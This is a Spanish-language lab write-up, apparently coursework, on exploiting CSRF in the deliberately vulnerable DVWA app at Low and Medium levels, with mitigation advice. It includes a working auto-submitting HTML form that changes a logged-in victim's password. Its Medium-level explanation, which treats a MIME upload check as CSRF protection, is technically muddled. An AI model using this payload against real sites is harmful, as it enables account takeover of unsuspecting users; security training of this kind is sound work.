# 🛡️ Práctica: Cross-Site Request Forgery (CSRF) en DVWA

---

# 📖 Introducción

**Cross-Site Request Forgery (CSRF)** es una vulnerabilidad que permite a un atacante realizar acciones no autorizadas en nombre de un usuario autenticado.  
Esto se logra haciendo que el navegador de la víctima envíe solicitudes maliciosas sin su consentimiento, aprovechando que ya está autenticada en la aplicación web objetivo.

Durante esta práctica, se analiza cómo explotar esta vulnerabilidad en DVWA en los niveles de seguridad **Low** y **Medium**.

---

# 🔷 Nivel de Seguridad: Low

## 📌 Descripción

En este nivel, DVWA no implementa ningún tipo de protección CSRF.  
La aplicación acepta cualquier solicitud POST válida, incluso si proviene de otro dominio o archivo local.


## 🛠️ Procedimiento

### 1. Creación del archivo malicioso

Se crea un archivo `csrf.html` con el siguiente contenido:

```html
<html>
  <body>
    <form action="http://127.0.0.1/DVWA/vulnerabilities/csrf/" method="POST">
      <input type="hidden" name="password_new" value="pass" />
      <input type="hidden" name="password_conf" value="pass" />
      <input type="hidden" name="change" value="change" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```

Este archivo realiza un cambio de contraseña de forma automática cuando la víctima lo visita.


### 2. Servir el archivo con un servidor HTTP

```bash
python3 -m http.server 8080
```

El atacante puede enviar este enlace a la víctima. Si la víctima está autenticada, su contraseña será cambiada sin su conocimiento.


📸 **Captura de la ejecución de `csrf.html` y envío automático del formulario:**


![CSRF_low](https://github.com/XaviGimReu/PPS-10836126/blob/main/template-main/RA3/RA3_2/assets/Cross_Site_Request_Forgery(CSRF)%20-%20low_1.png)

✅ Esto demuestra que no existe ninguna validación de origen o token para prevenir el ataque CSRF.


## 📋 Resumen

- El ataque CSRF es exitoso debido a la falta total de protección.

- El servidor acepta cualquier solicitud POST con los campos correctos.


## 🛡️ Medidas de Mitigación

- Incluir un **token CSRF único** y **aleatorio** en todos los formularios sensibles.

- Validar el **referer/origin** de las solicitudes entrantes.

- Utilizar cabeceras específicas (como `SameSite`) para cookies.

---

# 🔶 Nivel de Seguridad: Medium

## 📌 Descripción

En este nivel, DVWA introduce una medida adicional de seguridad: **restricción de tipo MIME** en las cargas, que en este caso fue usada para simular el ataque.

El atacante intenta subir un archivo `.php` con contenido malicioso que ejecuta la misma acción de cambio de contraseña.


## 🛠️ Procedimiento

### 1. Renombrar el archivo malicioso

Se renombra `csrf.html` como `csrf.php` para que pueda ser ejecutado desde el servidor al cargarlo:

```bash
mv csrf.html csrf.php
```

### 2. Servir el archivo con un servidor HTTP

Se accede al apartado de **File Upload** y se sube `csrf.php`.

DVWA en nivel Medium **permite la carga del archivo PHP**, ejecutándolo al acceder a la URL generada.



📸 **Captura tras la carga del archivo PHP malicioso:**


![CSRF_med](https://github.com/XaviGimReu/PPS-10836126/blob/main/template-main/RA3/RA3_2/assets/Cross_Site_Request_Forgery(CSRF)%20-%20med_1.png)

✅ Esto demuestra que, aunque la protección directa contra CSRF podría haber mejorado, **la ejecución del script desde un archivo externo sigue siendo posible** al combinarlo con vulnerabilidades como File Upload.


## 📋 Resumen

- El sistema sigue siendo vulnerable mediante la combinación de CSRF y File Upload.

- La ejecución del archivo malicioso desde el servidor causa el cambio de contraseña automáticamente.


## 🛡️ Medidas de Mitigación (recomendadas adicionales)

- Restringir la carga de archivos únicamente a tipos MIME seguros (por ejemplo, imágenes).

- Evitar que se ejecuten archivos subidos desde rutas públicas.

- Aplicar validaciones de tokens CSRF y cookies con política `SameSite=strict`.


---

## 📬 Referencias

**[Brute Force](https://github.com/XaviGimReu/PPS-10836126/tree/main/template-main/RA3/RA3_2/Brute%20Force)**&nbsp;&nbsp;&nbsp; | &nbsp;&nbsp;&nbsp;
**[Command Injection](https://github.com/XaviGimReu/PPS-10836126/tree/main/template-main/RA3/RA3_2/Command%20Injection)**&nbsp;&nbsp;&nbsp; | &nbsp;&nbsp;&nbsp;
**[Content Secutiry Policy (CSP) Bypass](https://github.com/XaviGimReu/PPS-10836126/tree/main/template-main/RA3/RA3_2/Content%20Security%20Policy%20(CSP)%20Bypass)**&nbsp;&nbsp;&nbsp; | &nbsp;&nbsp;&nbsp;
**[Cross-Site Scripting (XSS)](https://github.com/XaviGimReu/PPS-10836126/tree/main/template-main/RA3/RA3_2/Cross-Site%20Scripting%20(XSS))**&nbsp;&nbsp;&nbsp; | &nbsp;&nbsp;&nbsp;
**[SQL Injection](https://github.com/XaviGimReu/PPS-10836126/tree/main/template-main/RA3/RA3_2/SQL%20Injection)**&nbsp;&nbsp;&nbsp; | &nbsp;&nbsp;&nbsp;
**[Weak Session IDs](https://github.com/XaviGimReu/PPS-10836126/tree/main/template-main/RA3/RA3_2/Weak%20Session%20IDs)**

---
